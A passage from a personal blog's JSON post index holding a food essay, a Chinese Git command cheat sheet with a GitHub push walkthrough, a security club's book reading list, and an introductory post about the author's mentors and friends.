一、番茄蛋汤精灵挺喜欢香港岛的老板的，一个带点广东口音的大叔，店里有鱼有猫，靠近门口的地方有张小桌子，上面堆了些有种年代意象的玩物，平时戴着细框眼镜，很是友好，买单时会跟你说谢谢，很平静的那种，静到直深心骨，声音有种大漠般的饱满，总之光那几声谢谢，也会再一次进店享食。 在这里用餐还是挺奢侈的，两个人可以吃到50+，但是东西量很足，第一次来点菜难免会浪费，量足的同时味也很足，整个店都有老板的那种气质，印象比较深的便是那份菠萝牛肉饭，汁液包裹着菠萝青菜与牛肉，这些食材的味道又锁在了汤汁里，交错相关，很是融洽。米饭虽也在一个盘子里却保持着很难得的干净，夫人会很喜欢这样的米饭，有着它该有的独立剔透的味道。我比较喜欢喝汤，所以这份饭到最后基本会被我用汤汁浇淋全身，米香即被困在了一层透明丝滑之下。吃得很愉快。老板娘还很贴心的送了份番茄蛋汤，味道也很出色。说到番茄蛋汤，不得不提一下番茄蛋汤精灵@Acaleph，靠一碗汤就可以让我吃完一顿饭的水母宝贝。 “成为优秀厨师的诀窍就是…遇上一个足以让你想要将自己所有的料理，都献给她的女人。” —— 食戟之灵 最早来这里是橙子介绍的，喝的生滚粥，肉片煮得很有力度，量也很够，一份粥两个人也可以吃饱。里边还有几片生菜，妖娆得躺在粥里，忍不住想揪出来咬几口。生滚粥当然主要品的是粥啦，粥也是很棒，记得连续吃了好几天，它与盛放它的黑色砂锅有着相近的味道，也表现着老板的那种气质——饱满沧桑却近人有力。 在这里，食物有着它该有的味道。在吃腻了外卖的那种干燥后，很长一段时间胃口处于闭塞的状态，偶然点的一份菠萝牛肉饭，解锁了一些新的体验。 二、点亮宿舍的柠檬由随手翻倒的满杯的柠檬绿茶所释放的意象怪物。 某家店的饮品里常常会放入大只的果块果片，基本啃完了水果茶水也就剩下一点，放了冰块的东西得趁冷喝，热了化了淡了，这杯饮品迷人的地方就少了，那种有点先前的调味但是又掺杂着融化的人工冰块的塑料味的东西，不是很能接受，以后也不会。 急着开电脑打翻了杯刚买的柠檬茶，不开心，其实最近遇到了很多不顺心的事，知道要去调整，却惰于烦躁与抱怨。倒翻的绿茶很无意地点亮了这个地方，擦干地面的时候，有很舒服的味道充盈着这间屋子，降温消燥，忙着期末考好久未拖的地，也趁着这个机会干净了一把。 不会喜欢鸡汤类的东西，并不是那么适合大部分人，有时候还会变成强扭某种境遇的措辞，看着不是很舒服。当然翻倒的柠檬水的清香是真，这个体验是真实存在的，也的确愉悦了一会儿，再过一会儿味道没了，便又回到了一股燥热中。以及地面似乎没拖干净，黏，乎，乎……","tags":[{"name":"煮字","slug":"煮字","permalink":"https://iCyris.github.io/tags/煮字/"}]},{"title":"GIT 时光机","date":"2017-05-12T16:17:27.000Z","path":"2017/05/13/git/","text":"Ak师傅的小灶上谈了些关于git的常见用法，回去以后做了些整理。 参考链接： Aklis写的wiki阮一峰的git教程廖雪峰的git教程 一、时光机硬件说明书 Workspace： 工作区 Index / Stage： 暂存区 Repository： 本地仓库 Remote： 远程仓库 HEAD： 当前分支 Commit history： 历史记录 0X01 零件组装这里有三种情况： 1. 在当前目录新建一个Git代码库(如果是要使用github上的库，需要先pull下来，不然无法 push到目标库，这里的第三种方法就可以。) $ git init 2. 新建目录，将其初始化为Git仓库 $ git init project-name 3. pull下来一个项目与其代码历史 $ git clone URL 0X02 时光机的配置Git有个设置文件.gitconfig，它可以全局配置，也可以项目配置。 1.显示当前的Git配置 $ git config --list 2.编辑Git配置文件 $ git config -e [--global] 3.设置提交代码时的用户信息 $ git config [--global] user.name &quot;name&quot; $ git config [--global] user.email &quot;email address&quot; 0X03 在时光机上注入add钙奶 1.添加指定文件到暂存区 $ git add file1 file2 ... 2.添加指定目录到暂存区（包括其中的子目录） $ git add dir（文件夹名称） 3.添加当前目录所有文件到暂存区 $ git add . 4.分次提交 $ git add -p 5.删除工作区文件，并且把这次删除放入暂存区 $ git rm file1 file2 ... 6.停止追踪指定文件（该文件会保留在工作区） $ git rm --cached file 7.改名文件，然后把这个改名文件放入暂存区 $ git mv file-original file-renamed 0X04 挪挪挪，挪进仓库 1.提交暂存区到仓库区 $ git commit -m &quot;message&quot; 2.提交暂存区指定文件到仓库区 $ git commit file1 file2 ... -m &quot;message&quot; 3.提交工作区自上次commit之后的变化，直接到仓库区 $ git commit -a 4.提交时显示所有diff信息 $ git commit -v 5.使用一次新的commit，替代上一次提交。如果代码没有任何新变化，则用来改写上一次commit的提交信息 $ git commit --amend -m &quot;message&quot; 6.重做上一次commit，并包括指定文件的新变化 $ git commit --amend file1 file2 ... 0X05 时光机分机 1.列出所有本地分支 $ git branch 2.列出所有远程分支 $ git branch -r 3.列出所有本地分支和远程分支 $ git branch -a 4.新建一个分支，但依然停留在当前分支 $ git branch [branch-name] 5.新建一个分支，并切换到该分支 $ git checkout -b [branch] 6.新建一个分支，指向指定commit $ git branch [branch] [commit] 7.新建一个分支，与指定的远程分支建立追踪关系 $ git branch --track [branch] [remote-branch] 8.切换到指定分支，并更新工作区 $ git checkout [branch-name] 9.切换到上一个分支 $ git checkout - 10.建立追踪关系，在现有分支与指定的远程分支之间 $ git branch --set-upstream [branch] [remote-branch] 11.合并指定分支到当前分支 $ git merge [branch] 12.选择一个commit，合并进当前分支 $ git cherry-pick [commit] 13.删除分支 $ git branch -d [branch-name] 14.删除远程分支 $ git push origin --delete [branch-name] $ git branch -dr [remote/branch] 0X06 Tag 1.列出所有tag $ git tag 2.新建一个tag在当前commit $ git tag [tag] 3.新建一个tag在指定commit $ git tag [tag] [commit] 4.删除本地tag $ git tag -d [tag] 5.删除远程tag $ git push origin :refs/tags/[tagName] 6.查看tag信息 $ git show [tag] 7.提交指定tag $ git push [remote] [tag] 8.提交所有tag $ git push [remote] --tags 9.新建一个分支，指向某个tag $ git checkout -b [branch] [tag] 0X07 信息查看 1.显示有变更的文件 $ git status 2.显示当前分支的版本历史 $ git log 3.显示commit历史，以及每次commit发生变更的文件 $ git log --stat 4.搜索提交历史，根据关键词 $ git log -S [keyword] 5.显示某个commit之后的所有变动，每个commit占据一行 $ git log [tag] HEAD --pretty=format:%s 6.显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件 $ git log [tag] HEAD --grep feature 7.显示某个文件的版本历史，包括文件改名 $ git log --follow [file] $ git whatchanged [file] 8.显示指定文件相关的每一次diff $ git log -p [file] 9.显示过去5次提交 $ git log -5 --pretty --oneline 10.显示所有提交过的用户，按提交次数排序 $ git shortlog -sn 11.显示指定文件是什么人在什么时间修改过 $ git blame [file] 12.显示暂存区和工作区的差异 $ git diff 13.显示暂存区和上一个commit的差异 $ git diff --cached [file] 14.显示工作区与当前分支最新commit之间的差异 $ git diff HEAD 15.显示两次提交之间的差异 $ git diff [first-branch]...[second-branch] 16.显示今天你写了多少行代码 $ git diff --shortstat &quot;@{0 day ago}&quot; 17.显示某次提交的元数据和内容变化 $ git show [commit] 18.显示某次提交发生变化的文件 $ git show --name-only [commit] 19.显示某次提交时，某个文件的内容 $ git show [commit]:[filename] 20.显示当前分支的最近几次提交 $ git reflog 0X08 远程同步篇 1.下载远程仓库的所有变动 $ git fetch [remote] 2.显示所有远程仓库 $ git remote -v 3.显示某个远程仓库的信息 $ git remote show [remote] 4.增加一个新的远程仓库，并命名 $ git remote add [shortname] [url] 5.取回远程仓库的变化，并与本地分支合并 $ git pull [remote] [branch] 6.上传本地指定分支到远程仓库 $ git push [remote] [branch] 7.强行推送当前分支到远程仓库，即使有冲突 $ git push [remote] --force 8.推送所有分支到远程仓库 $ git push [remote] --all 0X09 时光回溯篇 1.恢复暂存区的指定文件到工作区 $ git checkout [file] 2.恢复某个commit的指定文件到暂存区和工作区 $ git checkout [commit] [file] 3.恢复暂存区的所有文件到工作区 $ git checkout . 4.重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 $ git reset [file] 5.重置暂存区与工作区，与上一次commit保持一致 $ git reset --hard 6.重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 $ git reset [commit] 7.重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 $ git reset --hard [commit] 8.重置当前HEAD为指定commit，但保持暂存区和工作区不变 $ git reset --keep [commit] 9.新建一个commit，用来撤销指定commit，后者的所有变化都将被前者抵消，并且应用到当前分支 $ git revert [commit] 10.暂时将未提交的变化移除，稍后再移入 $ git stash $ git stash pop 二、Github与信仰 这个周目是关于Linux下git时光机的实际应用 —— 把已有项目推到Github上。 Github账号的创建与git的安装配置不再作说明。 1X01 设置Git设置用户名与email： git config --global user.name &quot;your name&quot; git config --global user.email &quot;youremail@lalala.com&quot; 此时在/home下会新建一个.gitconfig文件 1X02 配置SSH1.创建SSH Key $ ssh-keygen -t rsa -C &quot;youremail@lalala.com&quot; 系统会提示key的保存位置，一般为~/.ssh，接下来会请求输入口令，一路默认，敲三次回车即可。 然后登陆gayhub -&gt; Accounting settings -&gt; SSH key -&gt; Add SSH Key -&gt; 取个容易区分的名字 -&gt; 把~/.ssh/id_rsa.pub文件中的内容粘贴上去即可。 用下面的命令进行测试： ssh -T git@github.com 1X03 push and pull from github1.在新建的~/My_Message_Board目录中git clone已存在GitHub上的Repository git clone URL 2.先修改个readme，提交。 sudo vi README.md git status git add README.md git status git commit -m &quot;Cyris readme-change 5/17&quot; git status git remote add origin URL 报了个错： fatal: remote origin already exists. 解决方法： $ git remote rm origin 再来。 $ git remote add origin URL（这些URL都是github里复制的URL） 3.下面把它push上去 $ git push -u origin master 这里会要求输入GitHub账户的用户名和密码。输入即可。 4.提交完成，去GitHub看眼Repository。内容修改成功。","tags":[{"name":"GIT","slug":"GIT","permalink":"https://iCyris.github.io/tags/GIT/"},{"name":"Wiki","slug":"Wiki","permalink":"https://iCyris.github.io/tags/Wiki/"}]},{"title":"魔法禁书目录","date":"2017-04-15T01:38:00.000Z","path":"2017/04/15/wiki/","text":"vidar team整理的一份推荐书单，各个方向各个阶段均有。 推荐图书目录渗透方向：· 基础类&#160; &#160; &#160; &#160;《PHP基础教程.第4版》&#160; &#160; &#160; &#160;《PHP与MySQL权威指南》&#160; &#160; &#160; &#160;《Javascript权威指南》&#160; &#160; &#160; &#160;《Python基础教程》&#160; &#160; &#160; &#160;《Python 网络编程》&#160; &#160; &#160; &#160;《TCP/IP协议详解 三卷》&#160; &#160; &#160; &#160;《图解TCP/IP》&#160; &#160; &#160; &#160;《HTTP权威指南》&#160; &#160; &#160; &#160;《图解HTTP》&#160; &#160; &#160; &#160;《HTTP协议详解》&#160; &#160; &#160; &#160;《Python绝技：运用Python成为顶级黑客》 · 攻防类&#160; &#160; &#160; &#160;《白帽子讲WEB安全》&#160; &#160; &#160; &#160;《Web前端 黑客技术揭秘》&#160; &#160; &#160; &#160;《Kali Linux Web 渗透测试》&#160; &#160; &#160; &#160;《黑客攻防技术宝典Web实战篇》&#160; &#160; &#160; &#160;《SQL注入攻击与防御》&#160; &#160; &#160; &#160;《XSS跨站脚本攻击剖析与防御》&#160; &#160; &#160; &#160;《安全参考系列》&#160; &#160; &#160; &#160;《Python黑帽子：黑客与渗透测试编程之道》 逆向方向：· 基础类（建议按顺序学习）&#160; &#160; &#160; &#160;《汇编语言》&#160; &#160; &#160; &#160;《汇编语言编程艺术》&#160; &#160; &#160; &#160;《Windows环境下32位汇编语言程序设计-琢石成器 第3版》&#160; &#160; &#160; &#160;《WINDOWSPE权威指南》&#160; &#160; &#160; &#160;《C++反汇编与逆向分析技术揭秘》&#160; &#160; &#160; &#160;《Windows程序设计》&#160; &#160; &#160; &#160;《逆向工程实战》&#160; &#160; &#160; &#160;《逆向工程核心原理 》&#160; &#160; &#160; &#160;《逆向工程揭密/安全技术大系中文版》&#160; &#160; &#160; &#160;《Malware analyst’s cookbook》&#160; &#160; &#160; &#160;《Python灰帽子：黑客与逆向工程师的Python编程之道》 · 进阶类&#160; &#160; &#160; &#160;《加密与解密》&#160; &#160; &#160; &#160;《Windows PE权威指南》&#160; &#160; &#160; &#160;《恶意代码分析实战》&#160; &#160; &#160; &#160;《0day安全软件漏洞分析技术》&#160; &#160; &#160; &#160;《数据结构》（严蔚敏著） Android 方向：· 开发&#160; &#160; &#160; &#160;《疯狂JAVA讲义》&#160; &#160; &#160; &#160;《疯狂Android讲义》&#160; &#160; &#160; &#160;《第一行代码-Android》&#160; &#160; &#160; &#160;《Android移动开发一本就够了》&#160; &#160; &#160; &#160;《Android基础教程》&#160; &#160; &#160; &#160;《Android C++ 高级编程-使用NDK》&#160; &#160; &#160; &#160;《Android驱动开发权威指南》&#160; &#160; &#160; &#160;《Android软件安全与逆向分析》&#160; &#160; &#160; &#160;《深入理解Android II卷》&#160; &#160; &#160; &#160;《Android安全攻防实战》 Windows&amp;Linux 方向：&#160; &#160; &#160; &#160;《Windows程序设计》&#160; &#160; &#160; &#160;《Windows核心编程》&#160; &#160; &#160; &#160;《寒江独钓Windows内核安全编程》&#160; &#160; &#160; &#160;《鸟哥的linux私房菜基础篇+服务器篇》&#160; &#160; &#160; &#160;《Linux内核精髓》&#160; &#160; &#160; &#160;《深入理解LINUX内核》 网络方向：&#160; &#160; &#160; &#160;《思科网络技术学院教程CCNA Exploration: 网络基础知识》&#160; &#160; &#160; &#160;《思科 网络技术学院教程CCNA Exploration:路由协议和概念》&#160; &#160; &#160; &#160;《图解TCP/IP》&#160; &#160; &#160; &#160;《计算机网络》（Andrew S.Tanenbaum著）&#160; &#160; &#160; &#160;《Wireshark数据包分析实战》&#160; &#160; &#160; &#160;《网络分析技术揭秘》 无线电安全方向：&#160; &#160; &#160; &#160;《无线网络安全攻防实战进阶》&#160; &#160; &#160; &#160;《无线电安全攻防大揭秘》&#160; &#160; &#160; &#160;《射频识别(RFID)核心技术详解》&#160; &#160; &#160; &#160;《黑客大曝光：无线网络安全》&#160; &#160; &#160; &#160;《BackTrack 5 Wireless Penetration Testing Beginner’s Guide》 &#160; &#160; &#160; &#160;文章：（因为图书比较少，遂从某大佬处Get一些比较好的案例分析）&#160; &#160; &#160; &#160;《RFID Hacking ④ : ProxMark3 破解门禁》&#160; &#160; &#160; &#160;《RFID Hacking ③ : ProxMark3 使用案例：嗅探银行闪付卡信息》&#160; &#160; &#160; &#160;《HackRF嗅探蓝牙重放iBeacons信号》&#160; &#160; &#160; &#160;《永不消逝的电波（三）：低功耗蓝牙（BLE）入门之如何调戏别人的小米手环》&#160; &#160; &#160; &#160;《Mousejack Hacking : 利用MouseJack进行物理攻击浅析》&#160; &#160; &#160; &#160;《MouseJack Hacking 测试指南》&#160; &#160; &#160; &#160;《BLE Hacking：使用Ubertoothone扫描嗅探低功耗蓝牙》&#160; &#160; &#160; &#160;《RFID Hacking – 资源大合集》 新技术（容器、云、机器学习相关）：· Docker&#160; &#160; &#160; &#160;《第一本Docker书》&#160; &#160; &#160; &#160;《Docker入门实战》&#160; &#160; &#160; &#160;《Docker容器与容器云》&#160; &#160; &#160; &#160;《Docker开发实践》 · 机器学习&#160; &#160; &#160; &#160;《机器学习》&#160; &#160; &#160; &#160;《深入浅出数据分析》&#160; &#160; &#160; &#160;《啤酒与尿布》&#160; &#160; &#160; &#160;《集体智慧编程》&#160; &#160; &#160; &#160;《统计学习方法》 · 云计算&#160; &#160; &#160; &#160;《云计算：概念、技术与架构》&#160; &#160; &#160; &#160;《深入理解云计算：基本原理和应用程序编程技术》&#160; &#160; &#160; &#160;《云数据中心构建实战：核心技术、运维管理、安全与高可用》&#160; &#160; &#160; &#160;《云计算核心技术剖析》&#160; &#160; &#160; &#160;《实战Hadoop》 另外附上协会wiki","tags":[{"name":"Wiki","slug":"Wiki","permalink":"https://iCyris.github.io/tags/Wiki/"}]},{"title":"绿生","date":"2017-04-04T08:19:49.000Z","path":"2017/04/04/acaleph/","text":"干净，深刻，精致。这是那一刻的绿生，所带给我的欣喜。 一、绿生一直有搭一个个人博客的想法，现在终于做了起来。花了点时间，却也很开心。这里是Cyris的个人小站，他和阅读这篇文字的你们一样，经历和思考着这些那些。前几天和Ak师傅聊了聊，有了些新的想法，也有了下面的这些话。 有事想做的兴奋存一点也不错，干干净净地着手做起来也很棒。把日子过得精致即可。这份精致，也是对生活的一种自信。“我们读诗写诗，非为它的灵巧，我们读诗写诗，因为我们是人类的一员。而人类充满了热情”，对我来说，最有魅力的，还是那些拥有自己的热情的人。这里想提提Acaleph，Aklis以及蔡师傅。 蔡师傅是位地理教师，喜欢穿衬衫，卷袖子。他的课，一卷书，一张嘴，一幅画。他总能很流畅而优美地解释一些枯燥的东西，知识也好，做人也好，很是亲和。夏天吃完午饭，可以看到他靠着阳光在车里睡觉，这对于匆匆赶路的准备高考的我们来说，再棒不过。留点时间给自己。他也普通，也会抱怨，也会醉酒，也会点着烟，即使如此，他的烟味并非毫无营养，并熏染了一片人。他经历了很多我们所不能承受的东西，却也过得安和。某天有幸在路上遇到他，问，要去哪里呢，他说，去看看夫人，就在那边的餐馆里，刚开业，会忙。这让我想起来某节课上，他说，今天女儿要回来，雨大，我想就上半节课，去机场接接她。话后，教室很是安静，这半节课大家听得也很是用心。拍肩是个很简单的动作，但却感动了Cyris很久。平静却深刻的东西，最让人记忆。 在面试以后就没有和Ak师傅聊过了，中间也去过几次协会，那时候刚起步学C和Python，也不知道怎么和满屋的dalao们交流，Ak说，是这样的。很久没聊了，有空过来聊聊吧。有幸遇到Ak师傅。协会的新生测试后又和他聊了聊，讲了讲从开发到学习linux和渗透等方面的东西，虽然只是一个晚上，但Cyris对下面所要做的事，更清晰了点，这站博客，只是第一步。Ak师傅影响Cyris的地方在哪呢？Acaleph说过一句话，大概是，二十岁的人去玩三岁的时候想玩的玩具就没有意义了。Ak师傅可以把知识玩起来。在早先的培训中，他在讲知识的时候，Cyris从他的眼睛里看到了一种很稀有的成分。玩也是一种艺术，能把想玩的东西玩好的人，很棒。Ak说，探求真理者不可心存傲慢。共勉。 首先感谢Acaleph能让Cyris放纵喜欢，从起初的“可以说话的人”到现在各个领域的陪伴，很开心。最早见面的时候Cyris说，她就像早晨四五点的天空，虽然还没有看到具体的光亮，但那种色彩的欲出，让人兴奋不已，并开始期待着这一天，并开始期待着下一天。她有着一份优雅。Cyris很喜欢一句话，“抬头做人，低头做事”，我觉得她正是这样的一个人。她的喜欢与不喜欢很清晰，想要什么很明确，并能很努力地去尝试摘到它。我一直被一些自己不是很喜欢的理念束缚着，比如也会有没写完作业就没什么心情看自己喜欢的书什么的情况，这些都在慢慢改变。时间有限，能多做一点喜欢的事情，挺好。但这也不是一种逃脱的借口，所谓优秀，大概是最快速而质量地完成“其他任务”并精心投入到自己想完成的事中去吧ouo。愿我们都能成为我们所想成为的人。 二、关于我Web初学者，偶尔也会在站内发布一些文字。喜欢听着很舒服的音乐，喜欢动漫，喜欢尝试各种有趣的食物，喜欢自由地思考。如果你有什么有趣的想法，欢迎左转邮箱联系我。 时雨金时，抓住有味。","tags":[{"name":"煮字","slug":"煮字","permalink":"https://iCyris.github.io/tags/煮字/"}]}]